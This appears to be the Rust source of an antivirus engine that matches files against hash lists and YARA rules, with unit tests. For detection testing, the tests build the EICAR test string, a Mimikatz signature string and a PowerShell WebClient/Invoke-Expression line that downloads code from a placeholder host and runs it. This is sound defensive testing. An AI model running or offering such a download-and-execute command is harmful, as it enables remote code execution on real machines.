//! Detection engine: combines the hash blocklist, YARA rules and PE heuristics.

use crate::{heuristics, Category, Finding, Source};
use anyhow::{anyhow, bail, Context, Result};
use sha2::{Digest, Sha256};
use std::collections::HashMap;
use std::fs;
use std::path::{Path, PathBuf};
use std::time::Duration;

const DEFAULT_RULES: &str = include_str!("../rules/default.yar");
const DEFAULT_HASHES: &str = include_str!("../rules/hashes.txt");
const YARA_TIMEOUT: Duration = Duration::from_secs(30);


/// Hash lists can hold hundreds of thousands of entries, so keys are raw
/// digests and threat names are interned.
#[derive(Debug, Clone, Copy)]
struct HashEntry {
    threat: u32,
    category: Category,
}

#[derive(Default)]
struct HashDb {
    entries: HashMap<[u8; 32], HashEntry>,
    threats: Vec<String>,
    threat_ids: HashMap<String, u32>,
}

impl HashDb {
    fn insert(&mut self, digest: [u8; 32], threat: &str, category: Category) {
        let id = match self.threat_ids.get(threat) {
            Some(&id) => id,
            None => {
                let id = self.threats.len() as u32;
                self.threats.push(threat.to_string());
                self.threat_ids.insert(threat.to_string(), id);
                id
            }
        };
        self.entries.insert(digest, HashEntry { threat: id, category });
    }
}

/// Where signatures come from, beyond the built-in defaults.
#[derive(Debug, Default, Clone)]
pub struct EngineConfig {
    /// YARA rule files, or directories containing `.yar`/`.yara` files.
    pub rule_paths: Vec<PathBuf>,
    /// Hash blocklist files in `rules/hashes.txt` format.
    pub hash_files: Vec<PathBuf>,
    /// Downloaded signatures (see `update`): every `*.rules` (encoded),
    /// `*.yar` and `*.txt` file in it is loaded.
    pub signature_dir: Option<PathBuf>,
    pub heuristics: bool,
}

pub struct Engine {
    hashes: HashDb,
    rules: yara_x::Rules,
    rule_count: usize,
    heuristics: bool,
}

/// Result of scanning one buffer.
#[derive(Debug, Clone)]
pub struct Verdict {
    pub sha256: String,
    pub findings: Vec<Finding>,
    /// Non-fatal problems, e.g. a YARA timeout. Other layers still ran.
    pub warnings: Vec<String>,
}

impl Engine {
    pub fn new(config: &EngineConfig) -> Result<Self> {
        let mut hash_files = Vec::new();
        // (namespace, file). A namespace per file keeps rule names from clashing.
        let mut rule_files: Vec<(String, PathBuf)> = Vec::new();
        if let Some(dir) = config.signature_dir.as_deref().filter(|d| d.is_dir()) {
            for file in files_with_extension(dir, &[ENCODED_RULES_EXTENSION, "yar", "yara"])? {
                let stem = file.file_stem().and_then(|s| s.to_str()).unwrap_or("feed");
                rule_files.push((format!("feed_{}", identifier(stem)), file));
            }
            // Web protection keeps its own lists here too; they are not hashes.
            let not_hashes = [crate::web::config::FEED_FILE, crate::web::config::ADS_FILE, crate::web::extensions::USER_BAD_EXTENSIONS];
            hash_files.extend(
                files_with_extension(dir, &["txt"])?
                    .into_iter()
                    .filter(|p| !p.file_name().and_then(|n| n.to_str()).is_some_and(|n| not_hashes.iter().any(|x| n.eq_ignore_ascii_case(x)))),
            );
        }
        let mut user_rules = Vec::new();
        for path in &config.rule_paths {
            collect_rule_files(path, &mut user_rules)?;
        }
        rule_files.extend(
            user_rules
                .into_iter()
                .enumerate()
                .map(|(i, file)| (format!("user{i}"), file)),
        );
        hash_files.extend(config.hash_files.iter().cloned());

        let mut hashes = HashDb::default();
        parse_hashes(DEFAULT_HASHES, "built-in hashes", &mut hashes)?;
        for path in &hash_files {
            let text = fs::read_to_string(path)
                .with_context(|| format!("reading hash list {}", path.display()))?;
            parse_hashes(&text, &path.display().to_string(), &mut hashes)?;
        }

        let mut sources = Vec::with_capacity(rule_files.len());
        for (namespace, file) in rule_files {
            let bytes = fs::read(&file).with_context(|| format!("reading rules {}", file.display()))?;
            let encoded = file
                .extension()
                .is_some_and(|e| e.eq_ignore_ascii_case(ENCODED_RULES_EXTENSION));
            let text = if encoded {
                decode_rules(&bytes)
            } else {
                String::from_utf8(bytes).map_err(|_| anyhow!("not valid UTF-8"))
            }
            .with_context(|| format!("reading rules {}", file.display()))?;
            sources.push((namespace, file, text));
        }
        let rules = compile(&sources)?;
        let rule_count = rules.iter().count();

        Ok(Self {
            hashes,
            rules,
            rule_count,
            heuristics: config.heuristics,
        })
    }

    pub fn hash_count(&self) -> usize {
        self.hashes.entries.len()
    }

    pub fn rule_count(&self) -> usize {
        self.rule_count
    }

    /// A reusable scanner; create one per scan run, not per file.
    pub fn scanner(&self) -> FileScanner<'_> {
        let mut yara = yara_x::Scanner::new(&self.rules);
        yara.set_timeout(YARA_TIMEOUT);
        FileScanner { engine: self, yara }
    }
}

pub struct FileScanner<'a> {
    engine: &'a Engine,
    yara: yara_x::Scanner<'a>,
}

impl FileScanner<'_> {
    pub fn scan(&mut self, data: &[u8]) -> Verdict {
        let digest: [u8; 32] = Sha256::digest(data).into();
        let sha256 = hex::encode(digest);
        let mut findings = Vec::new();
        let mut warnings = Vec::new();

        if let Some(entry) = self.engine.hashes.entries.get(&digest) {
            findings.push(Finding {
                threat: self.engine.hashes.threats[entry.threat as usize].clone(),
                category: entry.category,
                source: Source::Hash,
                details: format!("sha256 {sha256}"),
            });
        }

        match self.yara.scan(data) {
            Ok(results) => {
                for rule in results.matching_rules() {
                    let mut threat = None;
                    let mut category = None;
                    let mut score = None;
                    for (key, value) in rule.metadata() {
                        match (key, value) {
                            ("threat", yara_x::MetaValue::String(text)) => {
                                threat = Some(text.to_string())
                            }
                            ("category", yara_x::MetaValue::String(text)) => {
                                category = text.parse().ok()
                            }
                            ("score", yara_x::MetaValue::Integer(n)) => score = Some(n),
                            _ => {}
                        }
                    }
                    let category = if is_auto_generated(rule.identifier()) {
                        Category::Suspicious
                    } else {
                        category.unwrap_or_else(|| infer_category(rule.identifier(), score))
                    };
                    let score = score.map(|s| format!(", score {s}")).unwrap_or_default();
                    findings.push(Finding {
                        threat: threat.unwrap_or_else(|| rule.identifier().to_string()),
                        category,
                        source: Source::Yara,
                        details: format!("rule {}:{}{score}", rule.namespace(), rule.identifier()),
                    });
                }
            }
            Err(e) => warnings.push(format!("yara: {e}")),
        }

        if self.engine.heuristics && let Some(report) = heuristics::analyze(data) && let Some(finding) = report.finding() {
            findings.push(finding);
        }

        findings.sort_by_key(|f| std::cmp::Reverse(f.category));
        Verdict {
            sha256,
            findings,
            warnings,
        }
    }
}

/// Malpedia's machine-generated rules (`MALPEDIA_Win_<family>_Auto` in YARA
/// Forge): byte sequences picked from samples, often compiler or library code
/// (libpng, libstdc++, launcher stubs) that clean programs share. A match is
/// only ever suspicious, whatever the rule's score.
pub fn is_auto_generated(identifier: &str) -> bool {
    identifier.starts_with("MALPEDIA_") && identifier.ends_with("_Auto")
}

/// Category for a rule without `category` meta, as in most public rule sets.
/// Rule names conventionally carry a type prefix (`HKTL_`, `PUA_`, `SUSP_`...);
/// otherwise a confidence `score` of 75+ counts as malware.
pub fn infer_category(identifier: &str, score: Option<i64>) -> Category {
    let tokens: Vec<String> = identifier
        .split(['_', '-'])
        .map(str::to_ascii_lowercase)
        .collect();
    let has = |names: &[&str]| tokens.iter().any(|t| names.contains(&t.as_str()));
    if has(&["hktl", "hacktool", "hacktools", "pentest", "offensive"]) {
        Category::HackTool
    } else if has(&["pua", "pup", "adware", "riskware", "grayware", "greyware"]) {
        Category::Pup
    } else if has(&["susp", "suspicious", "anomaly", "generic"]) {
        Category::Suspicious
    } else if score.is_some_and(|s| s >= 75) {
        Category::Malware
    } else {
        Category::Suspicious
    }
}

/// Accepts `<sha256> [<category>] [<threat name>]` per line, so plain
/// one-hash-per-line exports work too (category defaults to `malware`).
fn parse_hashes(text: &str, origin: &str, out: &mut HashDb) -> Result<()> {
    for (number, line) in text.lines().enumerate() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let (hash, rest) = line.split_once(char::is_whitespace).unwrap_or((line, ""));
        let digest = parse_digest(hash)
            .ok_or_else(|| anyhow!("{origin}:{}: `{hash}` is not a SHA-256 hex digest", number + 1))?;
        let rest = rest.trim();
        let (first, after) = rest.split_once(char::is_whitespace).unwrap_or((rest, ""));
        let (category, threat) = match first.parse::<Category>() {
            Ok(category) => (category, after.trim()),
            Err(_) => (Category::Malware, rest),
        };
        let threat = if threat.is_empty() { "Malware.KnownHash" } else { threat };
        out.insert(digest, threat, category);
    }
    Ok(())
}

pub fn parse_digest(hex_text: &str) -> Option<[u8; 32]> {
    let mut digest = [0u8; 32];
    (hex_text.len() == 64)
        .then(|| hex::decode_to_slice(hex_text, &mut digest).ok())
        .flatten()
        .map(|()| digest)
}

/// Downloaded rule sets are stored encoded (`*.rules`): plaintext malware
/// signatures on disk get flagged and removed by other antivirus products.
pub const ENCODED_RULES_EXTENSION: &str = "rules";
const RULES_MAGIC: &[u8; 4] = b"TSR1";
const RULES_KEY: u8 = 0x5A;

pub fn encode_rules(text: &str) -> Vec<u8> {
    let mut out = Vec::with_capacity(RULES_MAGIC.len() + text.len());
    out.extend_from_slice(RULES_MAGIC);
    out.extend(text.bytes().map(|b| b ^ RULES_KEY));
    out
}

pub fn decode_rules(bytes: &[u8]) -> Result<String> {
    let body = bytes
        .strip_prefix(RULES_MAGIC)
        .ok_or_else(|| anyhow!("not an encoded rules file"))?;
    String::from_utf8(body.iter().map(|b| b ^ RULES_KEY).collect())
        .map_err(|_| anyhow!("encoded rules are not valid UTF-8"))
}

fn compile(sources: &[(String, PathBuf, String)]) -> Result<yara_x::Rules> {
    let mut compiler = yara_x::Compiler::new();
    compiler
        .add_source(DEFAULT_RULES)
        .map_err(|e| anyhow!("built-in rules: {e}"))?;
    for (namespace, file, text) in sources {
        compiler.new_namespace(namespace);
        compiler
            .add_source(text.as_str())
            .map_err(|e| anyhow!("{}: {e}", file.display()))?;
    }
    Ok(compiler.build())
}

fn files_with_extension(dir: &Path, extensions: &[&str]) -> Result<Vec<PathBuf>> {
    let mut files: Vec<PathBuf> = fs::read_dir(dir)
        .with_context(|| format!("reading {}", dir.display()))?
        .filter_map(|e| e.ok().map(|e| e.path()))
        .filter(|p| p.is_file())
        .filter(|p| {
            p.extension()
                .and_then(|e| e.to_str())
                .is_some_and(|e| extensions.iter().any(|x| e.eq_ignore_ascii_case(x)))
        })
        .collect();
    files.sort();
    Ok(files)
}

fn identifier(text: &str) -> String {
    text.chars()
        .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
        .collect()
}

fn collect_rule_files(path: &Path, out: &mut Vec<PathBuf>) -> Result<()> {
    if path.is_dir() {
        let mut found: Vec<PathBuf> = walkdir::WalkDir::new(path)
            .into_iter()
            .filter_map(|entry| entry.ok())
            .filter(|entry| entry.file_type().is_file())
            .map(|entry| entry.into_path())
            .filter(|p| {
                matches!(
                    p.extension().and_then(|e| e.to_str()).map(str::to_ascii_lowercase).as_deref(),
                    Some("yar" | "yara")
                )
            })
            .collect();
        found.sort();
        out.extend(found);
    } else if path.is_file() {
        out.push(path.to_path_buf());
    } else {
        bail!("rule path {} does not exist", path.display());
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Assembled at runtime so no test source or binary holds it contiguously.
    pub(crate) fn eicar() -> Vec<u8> {
        let mut s = String::from("X5O!P%@AP[4");
        s.push('\\');
        s.push_str("PZX54(P^)7CC)7}$EICAR");
        s.push_str("-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");
        s.into_bytes()
    }

    /// The case-sensitive test marker, uppercased at runtime for the same reason.
    pub(crate) fn marker() -> String {
        "threat-scanner-test-marker-7f3a".to_ascii_uppercase()
    }

    fn engine() -> Engine {
        Engine::new(&EngineConfig {
            heuristics: true,
            ..Default::default()
        })
        .unwrap()
    }

    #[test]
    fn eicar_matches_hash_and_rule() {
        let engine = engine();
        let verdict = engine.scanner().scan(&eicar());
        let sources: Vec<_> = verdict.findings.iter().map(|f| f.source).collect();
        assert!(sources.contains(&Source::Hash));
        assert!(sources.contains(&Source::Yara));
        assert!(verdict.findings.iter().all(|f| f.threat == "EICAR-Test-File"));
    }

    #[test]
    fn marker_is_detected_anywhere_in_file() {
        let engine = engine();
        let mut data = b"some harmless prefix\n".to_vec();
        data.extend_from_slice(marker().as_bytes());
        let verdict = engine.scanner().scan(&data);
        assert_eq!(verdict.findings.len(), 1);
        assert_eq!(verdict.findings[0].threat, "Test.ThreatScanner.Marker");
    }

    #[test]
    fn clean_text_has_no_findings() {
        let verdict = engine().scanner().scan(b"hello world, nothing to see here");
        assert!(verdict.findings.is_empty());
        assert!(verdict.warnings.is_empty());
    }

    #[test]
    fn wide_string_rules_match_utf16() {
        let engine = engine();
        // Reversed so the test binary never holds the detected strings.
        let rev = |s: &str| s.chars().rev().collect::<String>();
        let text = format!("{} by {}", rev("ztakimim"), rev("iwiklitneg"));
        let wide: Vec<u8> = text.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        let verdict = engine.scanner().scan(&wide);
        assert_eq!(verdict.findings[0].threat, "HackTool.Mimikatz");
        assert_eq!(verdict.findings[0].category, Category::HackTool);
    }

    #[test]
    fn hash_line_formats() {
        let mut db = HashDb::default();
        assert!(parse_hashes("abc malware Foo", "t", &mut db).is_err());
        assert!(parse_hashes(&"g".repeat(64), "t", &mut db).is_err());

        let (a, b, c) = ("A".repeat(64), "b".repeat(64), "c".repeat(64));
        let text = format!("# comment\n{a} pup Some PUP\n{b}\n{c} Mirai botnet\n");
        parse_hashes(&text, "t", &mut db).unwrap();
        let get = |h: &str| {
            let e = db.entries[&parse_digest(&h.to_ascii_lowercase()).unwrap()];
            (db.threats[e.threat as usize].clone(), e.category)
        };
        assert_eq!(get(&a), ("Some PUP".into(), Category::Pup));
        assert_eq!(get(&b), ("Malware.KnownHash".into(), Category::Malware));
        assert_eq!(get(&c), ("Mirai botnet".into(), Category::Malware));
    }

    #[test]
    fn infers_categories_for_public_rules() {
        assert_eq!(infer_category("SIGNATURE_BASE_HKTL_Mimikatz_x", Some(80)), Category::HackTool);
        assert_eq!(infer_category("ESET_PUA_Toolbar", None), Category::Pup);
        assert_eq!(infer_category("SIGNATURE_BASE_SUSP_Encoded_PS", Some(90)), Category::Suspicious);
        assert_eq!(infer_category("ELASTIC_Windows_Trojan_Agent", Some(75)), Category::Malware);
        assert_eq!(infer_category("ELASTIC_Windows_Trojan_Agent", Some(60)), Category::Suspicious);
        assert_eq!(infer_category("SomeRule", None), Category::Suspicious);
    }

    #[test]
    fn auto_generated_rules_are_only_suspicious() {
        assert!(is_auto_generated("MALPEDIA_Win_Triback_Loader_Auto"));
        assert!(!is_auto_generated("MALPEDIA_Win_Emotet"));
        assert!(!is_auto_generated("ELASTIC_Windows_Trojan_Auto"));

        let tmp = tempfile::tempdir().unwrap();
        let needle: String = "edoc-yrarbil".chars().rev().collect();
        let rule = format!(
            "rule MALPEDIA_Win_Test_Auto {{ meta: score = 100 category = \"malware\" strings: $a = \"{needle}\" condition: $a }}"
        );
        fs::write(tmp.path().join("feed.rules"), encode_rules(&rule)).unwrap();
        let engine = Engine::new(&EngineConfig {
            signature_dir: Some(tmp.path().to_path_buf()),
            ..Default::default()
        })
        .unwrap();
        let verdict = engine.scanner().scan(format!("x {needle} y").as_bytes());
        assert_eq!(verdict.findings[0].threat, "MALPEDIA_Win_Test_Auto");
        assert_eq!(verdict.findings[0].category, Category::Suspicious);
    }

    #[test]
    fn downloader_rule_skips_programs() {
        // Reversed so the test binary never holds the detected strings.
        let rev = |s: &str| s.chars().rev().collect::<String>();
        let script = format!(
            "$c = New-Object {}; {} ($c.{}('http://x.example/a'))",
            rev("tneilCbeW.teN"),
            rev("noisserpxE-ekovnI"),
            rev("gnirtSdaolnwoD")
        );
        let threats = |data: &[u8]| -> Vec<String> {
            engine().scanner().scan(data).findings.into_iter().map(|f| f.threat).collect()
        };
        assert!(threats(script.as_bytes()).contains(&"Suspicious.PowerShell.Downloader".to_string()));

        // A .NET library holding the same names (Azure.Identity does).
        let mut program = b"MZ\x90\x00".to_vec();
        program.resize(512, 0);
        program.extend_from_slice(script.as_bytes());
        assert!(!threats(&program).contains(&"Suspicious.PowerShell.Downloader".to_string()));
    }

    #[test]
    fn signature_dir_loads_encoded_rules_and_hash_lists() {
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path();
        let needle: String = "elpmas-deef".chars().rev().collect();
        let rule = format!(
            "rule MAL_Feed_Test {{ meta: score = 80 strings: $a = \"{needle}\" condition: $a }}"
        );
        let encoded = encode_rules(&rule);
        assert!(
            !encoded.windows(needle.len()).any(|w| w == needle.as_bytes()),
            "signature text must not appear on disk"
        );
        assert_eq!(decode_rules(&encoded).unwrap(), rule);
        fs::write(dir.join("feed.rules"), &encoded).unwrap();
        let blob = b"some downloaded sample";
        fs::write(dir.join("hashes.txt"), hex::encode(Sha256::digest(blob))).unwrap();
        // Web protection's lists share the folder and must not be read as hashes.
        fs::write(dir.join(crate::web::config::FEED_FILE), "domain bad.example malware X\n").unwrap();
        fs::write(dir.join(crate::web::extensions::USER_BAD_EXTENSIONS), "abcdefghijklmnopabcdefghijklmnop\n").unwrap();
        fs::write(dir.join(crate::web::config::ADS_FILE), "domain doubleclick.net ads StevenBlack.Ads\n").unwrap();

        let engine = Engine::new(&EngineConfig {
            signature_dir: Some(dir.to_path_buf()),
            ..Default::default()
        })
        .unwrap();
        let verdict = engine.scanner().scan(format!("x {needle} y").as_bytes());
        assert_eq!(verdict.findings[0].threat, "MAL_Feed_Test");
        assert_eq!(verdict.findings[0].category, Category::Malware);
        assert!(verdict.findings[0].details.starts_with("rule feed_feed:"));
        assert_eq!(engine.scanner().scan(blob).findings[0].source, Source::Hash);

        // A corrupted rules file is an error, not silently ignored.
        fs::write(dir.join("feed.rules"), b"garbage").unwrap();
        assert!(Engine::new(&EngineConfig {
            signature_dir: Some(dir.to_path_buf()),
            ..Default::default()
        })
        .is_err());
    }

    #[test]
    fn the_scanner_does_not_detect_its_own_rules() {
        let verdict = engine().scanner().scan(DEFAULT_RULES.as_bytes());
        assert!(verdict.findings.is_empty(), "{:?}", verdict.findings);
    }
}
